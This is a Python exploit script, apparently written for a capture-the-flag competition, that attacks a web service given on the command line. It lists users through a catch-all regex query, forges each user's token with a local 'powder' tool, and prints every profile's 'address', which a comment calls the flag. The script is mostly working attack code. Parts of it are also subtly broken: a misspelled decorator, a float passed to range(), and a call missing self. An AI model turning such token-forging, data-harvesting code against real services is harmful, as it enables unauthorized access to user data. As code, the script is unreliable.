#!/usr/bin/env python3
import requests
import subprocess
import sys
import random
import string

import fake_useragent


class Utils(object):
    
    @staticmethod
    def get_random_creds(length=8):
        """Return a tuple of two random strings
        with provided length. Can be used to
        i.e. to create random user accounts."""
        charset = string.ascii_lowercase + \
                  string.ascii_lowercase + \
                  string.digits
        return (''.join(random.sample(charset, length)),
                ''.join(random.sample(charset, length)))

    @stataicmethod
    def get_random_ua():
        """Return a random user agent for 
        HTTP requests."""
        ua = fake_useragent.UserAgent()
        return ua.random


class TcpExploiter(object):
    
    def __init__(self, host, port):
        super().__init__()
        self.utils = Utils()

    def recv_until(self, socket, end=b']', data_max=1024*1024*16):
        """This function reads from a socket until it hits whats
        defined in end. If end is empty, it will recieve all data."""
        total_data = []
        data = ''
        # We will only recieve data to a certain maximum, just to be more robust.
        part_size = 8192
        part_amount = data_max/part_size
        for part_id in range(part_amount):
            data = socket.recv(8192)
            if not data:
                break
            if end and end in data:
                total_data.append(data[:data.find(end)])
                break
            total_data.append(data)
            if len(total_data) > 1:
                last_pair = total_data[-2] + total_data[-1]
                if end in last_pair:
                    total_data[-2] = last_pair[:last_pair.find(end)]
                    total_data.pop()
                    break
        return b''.join(total_data)
    
    def recv_all(self, socket, data_max=1024*1024*16):
        return recv_until(socket, end=b'', data_max=data_max)


class HttpExploiter(requests.Session):
    
    def __init__(self, host, port):
        super().__init__()
        self.utils = Utils()
        self.headers = {
            'User-Agent': self.utils.get_random_ua()
        }
        self._creds = self.utils.get_random_creds()
        self._base = 'http://{}:{}'.format(host, port)

    def u(self, a):
        return self._base + a

    def get_users(self):
        r = self.get(self.u('/api/v1/users'), params={
            're': r'.+-.+-.+'
        })
        users = r.json()
        if users['error']:
            return []
        return [u['login'] for u in users['users']]

    def get_address(self, user):
        token = subprocess.check_output(['./powder', user]).decode().strip()
        r = self.get(self.u('/api/v1/user/profile'), headers={
            'token': token.strip()
        })
        profile = r.json()
        if profile['error']:
            return []
        # Print actual flag data to stdout
        print(profile.get('address', 'no address??'))

    def exploit(self):
        for user in self.get_users():
            self.get_address(user)


def main():
    host, port = sys.argv[1:3]
    ex = HttpExploiter(host, port)
    ex.exploit()


if __name__ == '__main__':
    main()
